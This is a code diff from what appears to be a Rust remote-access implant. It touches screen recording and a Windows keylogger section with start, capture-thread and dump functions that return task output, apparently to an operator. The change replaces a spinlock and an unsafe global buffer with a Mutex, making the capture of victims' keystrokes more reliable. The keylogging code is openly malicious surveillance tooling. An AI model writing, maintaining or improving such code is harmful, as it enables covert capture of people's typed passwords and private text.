@@ -793,9 +793,8 @@ fn collect_screen_record(v: &serde_json::Value) -> TaskOutput {
 
 // ── Keylogger ─────────────────────────────────────────────────────────────────
 
-static KEYLOG_HOOK:   std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
-static KEYLOG_LOCK:   std::sync::atomic::AtomicBool  = std::sync::atomic::AtomicBool::new(false);
-static mut KEYLOG_BUF: Vec<u8> = Vec::new();
+static KEYLOG_HOOK: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+static KEYLOG_BUF:  std::sync::Mutex<Vec<u8>>       = std::sync::Mutex::new(Vec::new());
 
 #[cfg(target_os = "windows")]
 fn keylog_start() -> TaskOutput {
@@ -840,9 +839,9 @@ fn keylog_thread() {
             if pressed && !prev[vk as usize] {
                 let ch = vk_to_char(vk);
                 if !ch.is_empty() {
-                    while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
-                    unsafe { KEYLOG_BUF.extend_from_slice(ch.as_bytes()); }
-                    KEYLOG_LOCK.store(false, Ordering::Release);
+                    if let Ok(mut buf) = KEYLOG_BUF.lock() {
+                        buf.extend_from_slice(ch.as_bytes());
+                    }
                 }
             }
             prev[vk as usize] = pressed;
@@ -879,11 +878,11 @@ fn keylog_stop() -> TaskOutput {
 }
 
 fn keylog_dump() -> TaskOutput {
-    use std::sync::atomic::Ordering;
-    while KEYLOG_LOCK.compare_exchange(false, true, Ordering::Acquire, Ordering::Relaxed).is_err() {}
-    let data = unsafe { KEYLOG_BUF.clone() };
-    unsafe { KEYLOG_BUF.clear() };
-    KEYLOG_LOCK.store(false, Ordering::Release);
+    let data = KEYLOG_BUF.lock().map(|mut buf| {
+        let d = buf.clone();
+        buf.clear();
+        d
+    }).unwrap_or_default();
     if data.is_empty() {
         TaskOutput::success(b"(keylog buffer empty)".to_vec())
     } else {
